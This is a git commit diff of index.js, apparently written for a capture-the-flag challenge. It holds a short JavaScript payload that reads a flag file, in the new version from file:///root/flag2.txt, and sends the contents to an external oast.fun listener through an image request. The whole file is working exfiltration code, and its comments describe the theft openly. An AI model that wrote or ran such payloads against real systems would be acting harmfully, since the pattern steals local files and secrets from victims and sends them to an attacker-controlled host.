7816393b530c7ae75a23078bff2c1c28c74af7ea
groupeProjectapp <chablaarbi707@gmail.com>
2025-04-24 17:18:23 +0100

    wa 3afak

--- index.js
+++ index.js
@@ -1,6 +1,7 @@
-(async()=>{
-    // fetch the flag file off the local filesystem
-    const txt = await (await fetch('/flag2.txt')).text();
-    // exfiltrate it as a GET to your listener
-    new Image().src = 'https://nntdfrlpiazffctldarunhkvwn0hvbn8v.oast.fun/?flag=' + encodeURIComponent(txt);
+(async () => {
+    // read the real flag straight off the disk
+    const txt = await (await fetch('file:///root/flag2.txt')).text();
+    // exfiltrate it to your OAST listener
+    new Image().src = 'https://nntdfrlpiazffctldarunhkvwn0hvbn8v.oast.fun/?flag='
+                      + encodeURIComponent(txt);
   })();
